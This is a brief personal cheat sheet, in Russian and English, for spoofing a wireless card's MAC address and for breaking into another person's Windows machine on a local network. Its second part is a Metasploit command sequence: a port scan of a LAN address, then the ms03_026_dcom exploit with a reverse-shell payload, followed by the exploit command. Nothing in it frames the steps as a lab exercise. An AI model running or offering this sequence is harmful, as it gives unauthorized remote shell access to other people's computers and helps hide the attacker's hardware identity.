# met

Смена mac addresa

sudo ifconfig wlan0 down

sudo ifconfig wlan0 hw ether 00:11:22:33:44:55

ifconfig wlan0 up

******************************************************

подключение к чуэой Windows в локальной сети

msfconsole

git init

use auxiliary/scanner/portscan/tcp 

set PORTS 1-3000

set RHOSTS 192.168.0.101

run

search dcom

use exploit/windows/dcerpc/ms03_026_dcom

set payload windows/shell_reverse_tcp

show options

set RHOST 192.168.

set LHOST 192.168.

exploit
